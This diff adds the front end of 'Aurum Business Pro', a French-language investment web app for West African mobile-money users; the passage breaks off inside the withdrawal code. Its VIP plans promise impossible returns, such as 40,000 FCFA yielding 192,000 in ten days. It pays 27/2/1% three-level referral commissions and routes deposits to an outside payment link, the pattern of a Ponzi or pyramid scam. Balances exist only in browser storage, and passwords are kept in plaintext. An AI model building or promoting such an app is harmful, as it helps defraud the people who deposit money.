@@ -1,0 +1,2251 @@
+<!DOCTYPE html>                                           <!-- ================= LIVE BAR ================= -->
+
+<div class="live-box fade" id="liveBar">
+
+  <span class="icon">🔊</span>
+
+  <span id="liveText">
+    Chargement...
+  </span>
+
+</div>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aurum Business Pro</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+background:linear-gradient(135deg,#001f4d,#0a2a5c,#d4a437);
+min-height:1dvh;
+overflow-x:hidden;
+}
+
+.auth-container{
+width:100%;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:1dvh;
+padding:20px;
+}
+
+.auth-box{
+width:100%;
+max-width:420px;
+background:rgba(15,23,42,0.98);
+padding:25px;
+border-radius:24px;
+box-shadow:0 20px 40px rgba(0,0,0,0.4);
+}
+
+.logo-circle{
+width:90px;
+height:90px;
+border-radius:50%;
+background:linear-gradient(135deg,#d4a437,#f7d774);
+display:flex;
+justify-content:center;
+align-items:center;
+margin:0 auto 20px;
+font-size:40px;
+box-shadow:0 10px 25px rgba(245,197,66,0.4);
+}
+
+.title{
+text-align:center;
+font-size:28px;
+color:#f5c542;
+font-weight:700;
+margin-bottom:10px;
+}
+
+.subtitle{
+text-align:center;
+color:#cbd5e1;
+margin-bottom:25px;
+font-size:14px;
+}
+
+.input-group{
+display:flex;
+flex-direction:column;
+margin-bottom:15px;
+}
+
+.input-group label{
+margin-bottom:6px;
+color:#cbd5e1;
+font-size:13px;
+}
+
+.input-group input,
+.input-group select{
+padding:14px;
+border:none;
+border-radius:14px;
+background:#1e293b;
+color:#fff;
+font-size:14px;
+outline:none;
+}
+
+.input-group input:focus,
+.input-group select:focus{
+border:1px solid #f5c542;
+background:#111827;
+}
+
+.phone-box{
+display:flex;
+align-items:center;
+background:#1e293b;
+border-radius:14px;
+overflow:hidden;
+}
+
+.phone-box span{
+padding:14px;
+background:#0f172a;
+color:#f5c542;
+font-weight:700;
+}
+
+.phone-box input{
+flex:1;
+border:none;
+background:transparent;
+color:#fff;
+padding:14px;
+outline:none;
+}
+
+button{
+width:100%;
+padding:14px;
+border:none;
+border-radius:14px;
+cursor:pointer;
+font-weight:700;
+margin-top:10px;
+transition:0.3s;
+}
+
+button:hover{
+transform:scale(1.02);
+}
+
+.btn-primary{
+background:linear-gradient(135deg,#d4a437,#f7d774);
+color:#000;
+}
+
+.btn-secondary{
+background:#111827;
+color:#fff;
+}
+
+.security-box{
+margin-top:20px;
+background:#111827;
+border:1px solid #1e293b;
+color:#94a3b8;
+padding:14px;
+border-radius:14px;
+text-align:center;
+font-size:12px;
+}
+
+.small{
+text-align:center;
+margin-top:15px;
+font-size:12px;
+color:#94a3b8;
+}
+
+#app{
+display:none;
+width:100%;
+max-width:500px;
+margin:auto;
+min-height:100vh;
+background:#f5f7fb;
+position:relative;
+}
+
+.header{
+background:#0f172a;
+color:#fff;
+padding:18px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+position:sticky;
+top:0;
+z-index:999;
+}
+
+.logo{
+color:#f5c542;
+font-size:22px;
+font-weight:700;
+}
+
+.page{
+display:none;
+padding:15px;
+padding-bottom:120px;
+}
+
+.page.active{
+display:block;
+}
+
+.banner{
+width:100%;
+border-radius:18px;
+margin-bottom:15px;
+}
+
+.balance-box{
+background:linear-gradient(135deg,#0f172a,#1e293b);
+color:#fff;
+padding:20px;
+border-radius:18px;
+margin-bottom:15px;
+}
+
+.balance-box h1{
+margin-top:10px;
+font-size:30px;
+}
+
+.vip-status{
+margin-top:12px;
+background:#14b85a;
+padding:8px;
+border-radius:10px;
+text-align:center;
+font-size:13px;
+font-weight:600;
+}
+
+.revenue-box{
+background:#fff;
+border-radius:15px;
+padding:15px;
+margin-bottom:15px;
+display:flex;
+justify-content:space-between;
+box-shadow:0 5px 15px rgba(0,0,0,0.05);
+}
+
+.action-grid{
+display:grid;
+grid-template-columns:repeat(4,1fr);
+gap:10px;
+margin-bottom:20px;
+}
+
+.action-btn{
+background:#fff;
+padding:15px;
+border-radius:14px;
+text-align:center;
+font-size:13px;
+cursor:pointer;
+box-shadow:0 5px 10px rgba(0,0,0,0.05);
+}
+
+.card{
+background:#fff;
+border-radius:20px;
+overflow:hidden;
+margin-bottom:20px;
+box-shadow:0 10px 25px rgba(0,0,0,0.08);
+}
+
+.card img{
+width:100%;
+height:220px;
+object-fit:cover;
+}
+
+.card-content{
+padding:18px;
+}
+
+.grid-info{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:10px;
+font-size:14px;
+color:#555;
+margin-bottom:15px;
+}
+
+.profile-card{
+background:#fff;
+border-radius:20px;
+padding:25px;
+text-align:center;
+margin-bottom:15px;
+}
+
+.avatar{
+width:80px;
+height:80px;
+border-radius:50%;
+background:#f5c542;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:35px;
+margin:auto;
+}
+
+.menu{
+background:#fff;
+border-radius:18px;
+overflow:hidden;
+}
+
+.menu-item{
+display:flex;
+justify-content:space-between;
+padding:16px;
+border-bottom:1px solid #eee;
+cursor:pointer;
+}
+
+.nav{
+position:fixed;
+bottom:0;
+left:50%;
+transform:translateX(-50%);
+width:100%;
+max-width:500px;
+background:#fff;
+display:grid;
+grid-template-columns:repeat(4,1fr);
+border-top:1px solid #ddd;
+z-index:999;
+}
+
+.nav button{
+background:none;
+color:#0f172a;
+font-size:22px;
+}
+
+.download-box{
+margin-top:20px;
+padding:20px;
+border-radius:18px;
+background:linear-gradient(135deg,#0f172a,#1e293b);
+color:#fff;
+text-align:center;
+}
+
+.download-btn{
+background:linear-gradient(135deg,#d4a437,#f7d774);
+color:#000;
+margin-top:15px;
+}
+
+#installBtn{
+display:none;
+}
+
+.withdraw-modal{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.7);
+display:flex;
+justify-content:center;
+align-items:center;
+z-index:99999;
+padding:15px;
+}
+
+.withdraw-box{
+width:100%;
+max-width:420px;
+background:#fff;
+border-radius:24px;
+overflow:hidden;
+}
+
+.withdraw-header{
+background:linear-gradient(135deg,#0f172a,#1e293b);
+color:#fff;
+padding:18px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.withdraw-body{
+padding:20px;
+}
+
+.form-group{
+margin-bottom:18px;
+display:flex;
+flex-direction:column;
+}
+
+.form-group input,
+.form-group select{
+padding:14px;
+border-radius:14px;
+border:1px solid #d1d5db;
+font-size:14px;
+outline:none;
+background:#f8fafc;
+}
+
+.balance-info{
+background:#f1f5f9;
+padding:14px;
+border-radius:14px;
+margin-bottom:18px;
+}
+
+.withdraw-btn{
+background:linear-gradient(135deg,#d4a437,#f7d774);
+}
+
+.stats-grid{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:12px;
+margin-bottom:20px;
+}
+
+.stat-card{
+background:#fff;
+padding:18px;
+border-radius:18px;
+text-align:center;
+box-shadow:0 5px 15px rgba(0,0,0,0.05);
+}
+
+/* Styles ajoutés pour le tableau des 3 niveaux de parrainage */
+.team-grid {
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:10px;
+margin-bottom:20px;
+}
+.team-card {
+background:#fff;
+padding:12px;
+border-radius:14px;
+text-align:center;
+box-shadow:0 4px 10px rgba(0,0,0,0.05);
+}
+.team-card h4 {
+font-size:13px;
+color:#64748b;
+}
+.team-card p {
+font-size:20px;
+font-weight:700;
+color:#0f172a;
+margin-top:5px;
+}
+.team-table {
+width:100%;
+border-collapse:collapse;
+background:#fff;
+border-radius:14px;
+overflow:hidden;
+box-shadow:0 5px 15px rgba(0,0,0,0.05);
+margin-top:15px;
+font-size:13px;
+}
+.team-table th, .team-table td {
+padding:12px;
+text-align:left;
+border-bottom:1px solid #f1f5f9;
+}
+.team-table th {
+background:#0f172a;
+color:#fff;
+font-weight:500;
+}
+.badge-level {
+padding:4px 8px;
+border-radius:8px;
+font-size:11px;
+font-weight:600;
+background:#f1f5f9;
+color:#0f172a;
+}                                  /* ================= LIVE BAR ================= */
+
+.live-box{
+  position:fixed;
+  top:20px;
+  left:50%;
+  transform:translateX(-50%);
+  width:90%;
+  max-width:500px;
+  background:linear-gradient(90deg,#1e90ff,#0a58ca);
+  color:#fff;
+  padding:14px;
+  border-radius:15px;
+  display:none;
+  align-items:center;
+  gap:10px;
+  font-weight:bold;
+  box-shadow:0 5px 20px rgba(0,0,0,0.4);
+  z-index:999999;
+}
+
+.fade{
+  animation:fadeIn 0.5s;
+}
+
+@keyframes fadeIn{
+
+  from{
+    opacity:0;
+    transform:translateY(-10px);
+  }
+
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
+
+}
+
+.icon{
+  font-size:18px;
+}
+.telegram-float{
+position:fixed;
+bottom:90px;
+right:20px;
+width:60px;
+height:60px;
+border-radius:50%;
+background:#0088cc;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:28px;
+text-decoration:none;
+color:#fff;
+box-shadow:0 5px 20px rgba(0,0,0,0.3);
+z-index:99999;
+animation:pulse 1.5s infinite;
+}
+
+@keyframes pulse{
+
+0%{
+transform:scale(1);
+}
+
+50%{
+transform:scale(1.08);
+}
+
+100%{
+transform:scale(1);
+}
+
+}.bonus-container{
+width:100%;
+max-width:400px;
+margin:auto;
+padding:25px;
+background:#111827;
+border-radius:20px;
+text-align:center;
+color:white;
+box-shadow:0 0 20px rgba(0,0,0,0.4);
+}
+
+.bonus-container h2{
+margin-bottom:20px;
+font-size:24px;
+}
+
+.bonus-container input{
+width:100%;
+padding:14px;
+border:none;
+border-radius:12px;
+margin-bottom:15px;
+font-size:16px;
+outline:none;
+}
+
+.bonus-container button{
+width:100%;
+padding:14px;
+border:none;
+border-radius:12px;
+background:linear-gradient(135deg,#FFD700,#ffae00);
+font-weight:bold;
+font-size:16px;
+cursor:pointer;
+transition:0.3s;
+}
+
+.bonus-container button:hover{
+transform:scale(1.03);
+}
+
+.reward-bar-box{
+width:100%;
+height:22px;
+background:#2b2b2b;
+border-radius:20px;
+overflow:hidden;
+margin-top:20px;
+display:none;
+}
+
+.reward-bar{
+height:100%;
+width:0%;
+background:linear-gradient(90deg,#00ff88,#00c853);
+transition:1.2s;
+}
+
+#bonusMessage{
+margin-top:15px;
+font-size:15px;
+font-weight:600;
+}
+
+</style>
+</head>
+<body>                            <a href="https://t.me/Tradingoold"
+   target="_blank"
+   class="telegram-float">
+   💬
+</a>
+
+<div class="auth-container">
+<div class="auth-box" id="auth">
+
+<div class="logo-circle">💎</div>
+
+<h1 class="title">Aurum Business Pro</h1>
+
+<p class="subtitle">
+Plateforme digitale professionnelle sécurisée
+</p>
+
+<div class="input-group">
+<label>🌍 Pays</label>
+<select id="country" onchange="updatePhoneCode()">
+<option value="+226">🇧🇫 Burkina Faso (+226)</option>
+<option value="+225">🇨🇮 Côte d'Ivoire (+225)</option>
+<option value="+221">🇸🇳 Sénégal (+221)</option>
+<option value="+223">🇲 Mali (+223)</option>
+</select>
+</div>
+
+<div class="input-group">
+<label>📞 Téléphone</label>
+<div class="phone-box">
+<span id="phoneCode">+226</span>
+<input type="tel" id="phone" placeholder="XX XX XX XX">
+</div>
+</div>
+
+<div class="input-group">
+<label>📧 Email</label>
+<input type="email" id="email" placeholder="exemple@gmail.com">
+</div>
+
+<div class="input-group">
+<label>🔒 Mot de passe</label>
+<input type="password" id="pass" placeholder="••••••••">
+</div>
+
+<div class="input-group">
+<label>🎁 Code de parrainage</label>
+<input type="text" id="ref" placeholder="AURUM2026">
+</div>
+
+<button class="btn-primary" onclick="register()">
+Créer un compte
+</button>
+
+<button class="btn-secondary" onclick="login()">
+Se connecter
+</button>
+
+<div class="security-box">
+🔐 Connexion sécurisée • SSL • Protection Premium
+</div>
+
+<div class="small">
+Aurum Business Pro © 2026
+</div>
+
+</div>
+</div>
+
+<div id="app">
+
+<div class="header">
+<div class="logo">AURUM</div>
+<div id="userId">USER</div>
+</div>
+
+<div id="home" class="page active"></div>
+<div id="orders" class="page"></div>
+<div id="team" class="page"></div>
+<div id="me" class="page"></div>
+
+<div class="nav">
+<button onclick="showPage('home')">🏠</button>
+<button onclick="showPage('orders')">🚀</button>
+<button onclick="showPage('team')">👥</button>
+<button onclick="showPage('me')">⚙️</button>
+</div>
+
+<button id="installBtn">Installer</button>
+
+</div>
+
+<script>
+
+function updatePhoneCode(){
+
+const country = document.getElementById('country').value;
+document.getElementById('phoneCode').innerText = country;
+
+}
+
+updatePhoneCode();
+
+const auth = document.getElementById('auth');
+const app = document.getElementById('app');
+
+const home = document.getElementById('home');
+const ordersPage = document.getElementById('orders');
+const teamPage = document.getElementById('team');
+const mePage = document.getElementById('me');
+
+let users = JSON.parse(localStorage.getItem('users')) || [];
+let orders = JSON.parse(localStorage.getItem('orders')) || [];
+let transactions = JSON.parse(localStorage.getItem('transactions')) || [];
+
+let user = null;
+
+/* ================= PRODUITS PREMIUM ================= */
+
+const products = [
+
+{
+  id:1,
+  name:"VIP 1",
+  subtitle:"Starter Premium",
+  price:3000,
+  daily:750,
+  total:45000,
+  duration:60,
+  badge:"Populaire",
+  color:"#d4af37",
+  img:"https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:2,
+  name:"VIP 2",
+  subtitle:"Gold Business",
+  price:15000,
+  daily:1440,
+  total:43200,
+  duration:30,
+  badge:"Rentable",
+  color:"#c9a227",
+  img:"https://images.unsplash.com/photo-1559526324-593bc073d938?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:3,
+  name:"VIP 3",
+  subtitle:"Luxury Investor",
+  price:40000,
+  daily:19200,
+  total:192000,
+  duration:10,
+  badge:"VIP",
+  color:"#e5c158",
+  img:"https://images.unsplash.com/photo-1518546305927-5a555bb7020d?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:4,
+  name:"VIP 4",
+  subtitle:"Elite Premium",
+  price:60000,
+  daily:52800,
+  total:528000,
+  duration:10,
+  badge:"Elite",
+  color:"#f5d76e",
+  img:"https://images.unsplash.com/photo-1521791136064-7986c2920216?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:5,
+  name:"VIP 5",
+  subtitle:"Diamond Plan",
+  price:100000,
+  daily:84000,
+  total:840000,
+  duration:10,
+  badge:"Diamond",
+  color:"#ffd700",
+  img:"https://images.unsplash.com/photo-1556740749-887f6717d7e4?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:6,
+  name:"VIP 6",
+  subtitle:"Executive Club",
+  price:200000,
+  daily:129984,
+  total:1299840,
+  duration:10,
+  badge:"Executive",
+  color:"#ffcc33",
+  img:"https://images.unsplash.com/photo-1522202176988-66273c2fd55f?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:7,
+  name:"VIP 7",
+  subtitle:"Royal Investor",
+  price:350000,
+  daily:246720,
+  total:2467200,
+  duration:10,
+  badge:"Royal",
+  color:"#f0b90b",
+  img:"https://images.unsplash.com/photo-1507679799987-c73779587ccf?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:8,
+  name:"VIP 8",
+  subtitle:"Prestige Max",
+  price:550000,
+  daily:412488,
+  total:4124880,
+  duration:10,
+  badge:"Prestige",
+  color:"#f7c948",
+  img:"https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:9,
+  name:"VIP 9",
+  subtitle:"Imperial Gold",
+  price:800000,
+  daily:600000,
+  total:6000000,
+  duration:10,
+  badge:"Imperial",
+  color:"#ffdf6c",
+  img:"https://images.unsplash.com/photo-1460317442991-0ec209397118?q=80&w=1200&auto=format&fit=crop"
+},
+
+{
+  id:10,
+  name:"VIP 10",
+  subtitle:"Ultimate Emirates",
+  price:1000000,
+  daily:800400,
+  total:8004000,
+  duration:10,
+  badge:"Ultra VIP",
+  color:"#ffb703",
+  img:"https://images.unsplash.com/photo-1497366754035-f200968a6e72?q=80&w=1200&auto=format&fit=crop"
+}
+
+];
+
+function save(){
+
+localStorage.setItem('users',JSON.stringify(users));
+localStorage.setItem('orders',JSON.stringify(orders));
+localStorage.setItem('transactions',JSON.stringify(transactions));
+
+}
+
+function updateCurrentUser(){
+
+const index = users.findIndex(u=>u.id===user.id);
+
+if(index !== -1){
+users[index] = user;
+}
+
+save();
+
+}
+
+function register(){
+
+const phone = document.getElementById('phone').value.trim();
+const pass = document.getElementById('pass').value.trim();
+const ref = document.getElementById('ref').value.trim();
+
+if(!phone || !pass){
+alert('Veuillez remplir tous les champs');
+return;
+}
+
+if(users.find(u=>u.phone===phone)){
+alert('Compte déjà existant');
+return;
+}
+
+const newUser = {
+id:Date.now(),
+phone,
+password:pass,
+balance:500,
+code:'AI'+Math.random().toString(36).substring(2,8),
+referrer:ref
+};
+
+users.push(newUser);
+save();
+
+alert('Compte créé avec succès. Bonus d\'inscription de 500 FCFA accordé !');
+
+}
+
+function login(){
+
+const phone = document.getElementById('phone').value.trim();
+const pass = document.getElementById('pass').value.trim();
+
+const foundUser = users.find(
+u=>u.phone===phone && u.password===pass
+);
+
+if(!foundUser){
+alert('Identifiants incorrects');
+return;
+}
+
+user = foundUser;
+
+auth.style.display='none';
+app.style.display='block';
+
+document.getElementById('userId').innerText = user.phone;
+
+renderAll();
+
+}
+
+function logout(){
+
+user = null;
+auth.style.display='block';
+app.style.display='none';
+
+}
+
+function showPage(page){
+
+document.querySelectorAll('.page')
+.forEach(p=>p.classList.remove('active'));
+
+document.getElementById(page)
+.classList.add('active');
+
+}
+
+function renderHome(){
+
+let gains = transactions
+.filter(t=>t.user_id===user.id && t.type==='gain')
+.reduce((sum,t)=>sum+t.amount,0);
+
+home.innerHTML = `
+
+<img class="banner"
+src="https://mir-s3-cdn-cf.behance.net/project_modules/max_1200/5e342a106822209.5f992383e20e8.jpg">
+
+<div class="balance-box">
+<p>Solde disponible</p>
+<h1>${user.balance.toLocaleString()} FCFA</h1>
+<div class="vip-status">Compte VIP Actif</div>
+</div>
+
+<div class="stats-grid">
+<div class="stat-card">
+<h3>${gains.toLocaleString()}</h3>
+<p>Revenus</p>
+</div>
+
+<div class="stat-card">
+<h3>${orders.filter(o=>o.user_id===user.id).length}</h3>
+<p>VIP actifs</p>
+</div>
+</div>
+
+<div class="action-grid">
+<div class="action-btn" onclick="deposit()">💳<br>Dépôt</div>
+<div class="action-btn" onclick="withdraw()">🏧<br>Retrait</div>
+<div class="action-btn" onclick="showPage('orders')">🚀<br>VIP</div>
+<div class="action-btn" onclick="showPage('team')">👥<br>Équipe</div>
+</div>
+`;
+
+products.forEach((p,index)=>{
+
+home.innerHTML += `
+<div class="card">
+<img src="${p.img}">
+<div class="card-content">
+<h3>${p.name}</h3>
+<div class="grid-info">
+<p>Prix : <b>${p.price} FCFA</b></p>
+<p>Jour : <b>${p.daily} FCFA</b></p>
+<p>Total : <b>${p.total} FCFA</b></p>
+<p>Durée : <b>${p.duration} jours</b></p>
+</div>
+<button class="btn-primary" onclick="buy(${index})">
+Activer l'investissement
+</button>
+</div>
+</div>
+`;
+
+});
+
+}
+
+function buy(index){
+
+const p = products[index];
+
+if(user.balance < p.price){
+alert('Solde insuffisant');
+return;
+}
+
+user.balance -= p.price;
+
+orders.push({
+id:Date.now(),
+user_id:user.id,
+product:p.name,
+daily:p.daily,
+lastClaim: 0,
+purchaseTime: Date.now(),
+image: p.img
+});
+
+transactions.push({
+user_id:user.id,
+type:'achat',
+amount:p.price,
+date:new Date().toLocaleString()
+});
+
+/* --- LOGIQUE DE DISTRIBUTION AUTOMATIQUE DU PARRAINAGE SUR 3 NIVEAUX --- */
+// Niveau 1 : 27%
+if (user.referrer) {
+  let parent1 = users.find(u => u.code === user.referrer);
+  if (parent1) {
+    let bonus1 = p.price * 0.27;
+    parent1.balance += bonus1;
+    transactions.push({
+      user_id: parent1.id,
+      type: `Bonus Parrainage (Niveau 1 - Filleul: ${user.phone})`,
+      amount: bonus1,
+      date: new Date().toLocaleString()
+    });
+
+    // Niveau 2 : 2%
+    if (parent1.referrer) {
+      let parent2 = users.find(u => u.code === parent1.referrer);
+      if (parent2) {
+        let bonus2 = p.price * 0.02;
+        parent2.balance += bonus2;
+        transactions.push({
+          user_id: parent2.id,
+          type: `Bonus Parrainage (Niveau 2 - Filleul: ${user.phone})`,
+          amount: bonus2,
+          date: new Date().toLocaleString()
+        });
+
+        // Niveau 3 : 1%
+        if (parent2.referrer) {
+          let parent3 = users.find(u => u.code === parent2.referrer);
+          if (parent3) {
+            let bonus3 = p.price * 0.01;
+            parent3.balance += bonus3;
+            transactions.push({
+              user_id: parent3.id,
+              type: `Bonus Parrainage (Niveau 3 - Filleul: ${user.phone})`,
+              amount: bonus3,
+              date: new Date().toLocaleString()
+            });
+          }
+        }
+      }
+    }
+  }
+}
+
+updateCurrentUser();
+renderAll();
+
+alert('VIP activé avec succès');
+
+}
+
+function renderOrders(){
+
+const myOrders = orders.filter(o=>o.user_id===user.id);
+
+ordersPage.innerHTML = '<h2>Mes investissements</h2><br>';
+
+if(myOrders.length===0){
+ordersPage.innerHTML += '<p>Aucun investissement actif</p>';
+return;
+}
+
+myOrders.forEach(order=>{
+
+const maintenant = Date.now();
+const tempsEcoule = maintenant - (order.lastClaim || order.purchaseTime);
+const reste24h = 86400000 - tempsEcoule;
+
+let formatHeureAchat = new Date(order.purchaseTime).toLocaleString('fr-FR');
+let boutonTexte = "Réclamer le gain";
+let boutonDisabled = "";
+
+if (reste24h > 0) {
+  const dateDeblocage = new Date(maintenant + reste24h);
+  const options = { hour: '2-digit', minute: '2-digit' };
+  boutonTexte = `Disponible demain à ${dateDeblocage.toLocaleTimeString('fr-FR', options)}`;
+  boutonDisabled = "disabled style='background:#ccc; cursor:not-allowed; transform:none;'";
+}
+
+ordersPage.innerHTML += `
+<div class="card">
+<img src="${order.image || 'https://via.placeholder.com/150'}" style="width:100%; height:220px; object-fit:cover;">
+<div class="card-content">
+<h3>${order.product}</h3>
+<p style="margin-bottom: 5px; font-size:13px; color:#555;">Acheté le : <b>${formatHeureAchat}</b></p>
+<p style="margin-bottom: 15px;">Gain journalier : <b>${order.daily} FCFA</b></p>
+<button class="btn-primary" ${boutonDisabled} onclick="claim(${order.id})">
+${boutonTexte}
+</button>
+</div>
+</div>
+`;
+
+});
+
+}
+
+function claim(id){
+
+const order = orders.find(o=>o.id===id);
+
+if(!order) return;
+
+const maintenant = Date.now();
+const tempsEcoule = maintenant - (order.lastClaim || order.purchaseTime);
+
+if(tempsEcoule < 86400000){
+alert('Déjà réclamé aujourd’hui. Revenu disponible toutes les 24h.');
+return;
+}
+
+order.lastClaim = maintenant;
+user.balance += order.daily;
+
+transactions.push({
+user_id:user.id,
+type:'gain',
+amount:order.daily,
+date:new Date().toLocaleString()
+});
+
+updateCurrentUser();
+renderAll();
+
+alert('Gain réclamé');
+
+}
+
+function renderTeam(){
+
+const link = window.location.origin +
+window.location.pathname + '?ref=' + user.code;
+
+/* --- RECHERCHE ET CALCUL AUTOMATIQUE DU PARRAINAGE EN 3 NIVEAUX --- */
+let level1 = [];
+let level2 = [];
+let level3 = [];
+
+// Trouver le Niveau 1 (ceux qui ont utilisé le code de l'utilisateur en cours)
+level1 = users.filter(u => u.referrer === user.code);
+
+// Trouver le Niveau 2 (ceux qui ont utilisé le code des membres du Niveau 1)
+level1.forEach(u1 => {
+  let subTeam = users.filter(u => u.referrer === u1.code);
+  level2 = level2.concat(subTeam);
+});// Trouver le Niveau 3 (ceux qui ont utilisé le code des membres du Niveau 2)
+level2.forEach(u2 => {
+  let subTeam = users.filter(u => u.referrer === u2.code);
+  level3 = level3.concat(subTeam);
+});
+
+teamPage.innerHTML = `
+<div class="card">
+<div class="card-content">
+<h3>Mon lien d’invitation</h3>
+<p style="margin:10px 0;word-break:break-all;">
+${link}
+</p>
+<button class="btn-primary" onclick="copyLink('${link}')">
+Copier mon lien
+</button>
+</div>
+</div>
+
+<h3>Statistiques d'équipe</h3>
+<br>
+<div class="team-grid">
+  <div class="team-card">
+    <h4>Niveau 1 (27%)</h4>
+    <p>${level1.length}</p>
+  </div>
+  <div class="team-card">
+    <h4>Niveau 2 (2%)</h4>
+    <p>${level2.length}</p>
+  </div>
+  <div class="team-card">
+    <h4>Niveau 3 (1%)</h4>
+    <p>${level3.length}</p>
+  </div>
+</div>
+
+<h3>Liste des membres</h3>
+<table class="team-table">
+  <thead>
+    <tr>
+      <th>Téléphone</th>
+      <th>Niveau</th>
+    </tr>
+  </thead>
+  <tbody>
+    ${level1.map(u => `<tr><td>${u.phone}</td><td><span class="badge-level">Niveau 1</span></td></tr>`).join('')}
+    ${level2.map(u => `<tr><td>${u.phone}</td><td><span class="badge-level" style="background:#e0f2fe; color:#0369a1;">Niveau 2</span></td></tr>`).join('')}
+    ${level3.map(u => `<tr><td>${u.phone}</td><td><span class="badge-level" style="background:#fef3c7; color:#b45309;">Niveau 3</span></td></tr>`).join('')}
+    ${(level1.length === 0 && level2.length === 0 && level3.length === 0) ? '<tr><td colspan="2" style="text-align:center; color:#94a3b8;">Aucun membre inscrit dans votre réseau</td></tr>' : ''}
+  </tbody>
+</table>
+`;
+
+}
+
+function copyLink(link){
+
+navigator.clipboard.writeText(link);
+alert('Lien copié');
+
+}
+
+function renderMe(){
+
+mePage.innerHTML = `
+
+<div class="profile-card">
+<div class="avatar">👤</div>
+<h2 style="margin-top:15px;">${user.phone}</h2>
+<p>Membre Premium</p>
+</div>
+
+<div class="menu">
+
+<div class="menu-item" onclick="deposit()">
+<span>💳 Dépôt</span>
+<span>›</span>
+</div>
+
+<div class="menu-item" onclick="withdraw()">
+<span>🏧 Retrait</span>
+<span>›</span>
+</div>
+
+<div class="menu-item" onclick="showTransactions()">
+<span>📜 Historique</span>
+<span>›</span>
+</div>
+
+<div class="menu-item" onclick="logout()">
+<span>⏻ Déconnexion</span>
+<span>›</span>
+</div>
+
+</div>
+
+<div class="download-box">
+<h3>Installer l’application</h3>
+<p style="margin-top:10px;">
+Téléchargez Aurum Business Pro sur votre téléphone
+</p>
+<button class="download-btn" id="installAppBtn">
+📲 Télécharger l'application
+</button>
+</div>
+<!-- ================= BONUS BOX ================= -->
+<div class="bonus-container">
+
+  <h2>🎁 Code Bonus</h2>
+
+  <input type="text" id="bonusCode" placeholder="Entrez votre code bonus">
+
+  <button onclick="claimBonus()">Recevoir Bonus</button>
+
+  <!-- BARRE BONUS -->
+  <div class="reward-bar-box">
+    <div class="reward-bar" id="rewardBar"></div>
+  </div>
+
+  <!-- TEXTE -->
+  <p id="bonusMessage"></p>
+
+</div>
+`;
+
+setTimeout(()=>{
+
+const btn = document.getElementById('installAppBtn');
+
+if(btn){
+btn.onclick = installPWA;
+}
+
+},100);
+
+}
+
+function showTransactions(){
+
+let myTx = transactions.filter(
+t=>t.user_id===user.id
+);
+
+let html = `
+
+<div class="card">
+<div class="card-content">
+
+<div style="
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:20px;
+">
+
+<h3>Historique des transactions</h3>
+
+<button onclick="renderMe()" style="
+padding:10px 15px;
+border:none;
+border-radius:10px;
+background:#0f172a;
+color:#fff;
+cursor:pointer;
+">
+← Retour
+</button>
+
+</div>
+`;
+
+if(myTx.length===0){
+
+html += `
+<p>Aucune transaction</p>
+`;
+
+}else{
+
+myTx.reverse().forEach(t=>{
+
+let color = '#111';
+
+if(t.type === 'gain'){
+color = 'green';
+}
+
+if(t.type === 'retrait'){
+color = 'red';
+}
+
+if(t.type === 'achat'){
+color = '#d4a437';
+}
+
+html += `
+
+<div style="
+padding:15px;
+border-bottom:1px solid #eee;
+margin-bottom:10px;
+">
+
+<p style="
+font-weight:700;
+color:${color};
+text-transform:capitalize;
+">
+${t.type}
+</p>
+
+<p style="
+font-size:18px;
+margin:5px 0;
+">
+${t.amount.toLocaleString()} FCFA
+</p>
+
+<p style="
+font-size:12px;
+color:#666;
+">
+${t.date || ''}
+</p>
+
+</div>
+
+`;
+
+});
+
+}
+
+html += `
+</div>
+</div>
+`;
+
+mePage.innerHTML = html;
+
+}
+
+function deposit(){
+window.open('https://westpay.cloud/link/yum3cdaamouf08cr','_blank');
+}
+
+function withdraw(){
+
+const modal = document.createElement('div');
+modal.className = 'withdraw-modal';
+
+modal.innerHTML = `
+<div class="withdraw-box">
+<div class="withdraw-header">
+<h2>Retrait</h2>
+<span style="cursor:pointer;font-size:28px;" id="closeWithdraw">×</span>
+</div>
+
+<div class="withdraw-body">
+
+<div class="form-group">
+<label>Méthode</label>
+<select id="withdrawMethod">
+<option>Wave</option>
+<option>Orange Money</option>
+<option>Moov Money</option>
+<option>MTN Mobile Money</option>
+</select>
+</div>
+
+<div class="form-group">
+<label>Numéro</label>
+<input type="tel" id="withdrawPhone">
+</div>
+
+<div class="form-group">
+<label>Montant</label>
+<input type="number" id="withdrawAmount">
+</div>
+
+<div class="balance-info">
+Solde disponible :
+<b>${user.balance.toLocaleString()} FCFA</b>
+</div>
+
+<button class="withdraw-btn" id="confirmWithdraw">
+Confirmer le retrait
+</button>
+
+</div>
+</div>
+`;
+document.body.appendChild(modal);
+
+modal.addEventListener('click',(e)=>{
+if(e.target===modal){
+modal.remove();
+}
+});
+
+document.getElementById('closeWithdraw').onclick = ()=>{
+modal.remove();
+};
+
+document.getElementById('confirmWithdraw').onclick = ()=>{
+
+const amount = Number(
+document.getElementById('withdrawAmount').value
+);
+
+if(!amount || amount<=0){
+alert('Montant invalide');
+return;
+}
+
+if(amount > user.balance){
